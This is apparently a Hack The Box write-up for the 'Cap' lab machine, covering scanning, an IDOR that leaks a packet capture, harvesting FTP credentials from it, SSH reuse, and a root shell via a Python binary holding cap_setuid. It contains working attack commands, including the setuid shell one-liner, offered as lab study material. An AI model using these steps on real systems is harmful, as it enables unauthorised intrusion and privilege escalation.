# Machine Write-Up: Cap (Hack The Box)

## 1. Reconnaissance and Enumeration
Initial network reconnaissance was performed to identify open services and potential entry points.

`nmap -p- -T4 10.129.61.49`

The scan results indicated the following services were active:
* Port 21 (FTP): Plaintext protocol, often vulnerable to credential harvesting.
* Port 22 (SSH): Secure Shell for remote access.
* Port 80 (HTTP): Running Gunicorn/Werkzeug.

Initial attempts to access the FTP server using anonymous credentials (user: anonymous, pass: [blank]) failed, confirming that standard misconfigurations were not present on the FTP service itself.

## 2. Web Application Analysis & IDOR Exploitation
Enumeration of the web application revealed a "Security Dashboard" function. Testing the functionality revealed an Insecure Direct Object Reference (IDOR).

`curl -i -L [http://10.129.61.49/data/1](http://10.129.61.49/data/1)`

By manipulating the URI parameter, it was possible to access historical network captures intended for other users. We verified the IDOR vulnerability and identified that the relevant capture was indexed at ID 0.

`curl -sL [http://10.129.61.49/data/0](http://10.129.61.49/data/0) -o capture_0.pcap`

## 3. Traffic Analysis & Credential Harvesting
The downloaded PCAP file was analyzed for cleartext credentials, as the capture contained unfiltered network traffic.

`strings capture_0.pcap | grep -i "USER" -A 5`
`strings capture_0.pcap | grep -i "PASS" -A 5`

Analysis revealed the username "nathan" and his corresponding password in cleartext within the FTP traffic stream. Leveraging credential reuse, the discovered credentials were used to authenticate via SSH.

`ssh nathan@10.129.61.49`

## 4. Privilege Escalation
Post-exploitation enumeration was conducted to identify vectors for privilege escalation, specifically checking for misconfigured Linux Capabilities assigned to binaries.

`getcap -r / 2>/dev/null`

The enumeration identified that `/usr/bin/python3.8` possessed the `cap_setuid` capability. This allows the binary to escalate privileges by modifying the Effective User ID (EUID). The system was compromised by spawning a root shell via the Python interpreter:

`/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

The UID was successfully elevated to 0, granting root access to the target system.

---

## Key Technical Concepts

### IDOR (Insecure Direct Object Reference)
A security vulnerability that occurs when an application provides direct access to objects based on user-supplied input without performing an authorization check. This allows attackers to bypass access controls and access unauthorized data.

### PCAP (Packet Capture)
A data format used to capture network traffic live or from a stored file. It contains the raw packets transmitted over the network and can be analyzed using tools like Wireshark or tcpdump.

### Linux Capabilities
A feature of the Linux kernel that divides the power of the "root" superuser into distinct, smaller units of privilege. This allows processes to perform specific privileged tasks without having full administrative access.
